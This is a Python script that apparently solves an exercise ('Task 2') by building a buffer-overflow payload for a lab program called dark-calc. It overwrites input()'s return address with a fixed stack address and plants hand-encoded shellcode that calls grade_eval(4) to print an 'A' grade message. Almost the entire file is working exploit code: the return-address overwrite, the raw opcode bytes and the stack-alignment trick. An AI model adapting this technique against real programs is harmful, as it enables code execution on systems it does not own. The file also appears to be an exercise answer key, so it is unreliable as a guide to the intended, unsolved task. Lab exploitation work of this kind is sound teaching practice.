#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc (executable stack).

Goal: call grade_eval(4) so that the program prints
      "Hope A will be your grade!".

The stack of dark-calc is a fixed RWX mmap at 0x721000000000, so the
buffer address 0x721000800fd0 is constant.  We overwrite input()'s
return address with that address and drop a small stub there:

    push exit@plt       ; return address for grade_eval + ABI alignment
    mov edi, 4          ; grade_eval's argument
    push grade_eval     ; 0x401a87
    ret                 ; "call" it (rel32 cannot span 0x72... -> 0x40...)

The extra push keeps rsp % 16 == 8 at grade_eval's entry, as the SysV
ABI requires, and makes the process exit cleanly after stdout is
flushed.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)
p32 = lambda v: struct.pack("<I", v)

STACK_BASE = 0x721000800FD0      # address of input()'s expression[16]
GRADE_EVAL = 0x401A87            # grade_eval()
EXIT_PLT = 0x401880              # exit@plt

stub = b"\x68" + p32(EXIT_PLT)     # push exit@plt
stub += b"\xbf" + p32(4)           # mov edi, 4
stub += b"\x68" + p32(GRADE_EVAL)  # push grade_eval
stub += b"\xc3"                    # ret

payload = stub.ljust(24, b"\x90")     # buffer + saved rbp
payload += p64(STACK_BASE)            # return address -> stub

sys.stdout.buffer.write(payload + b"\n")
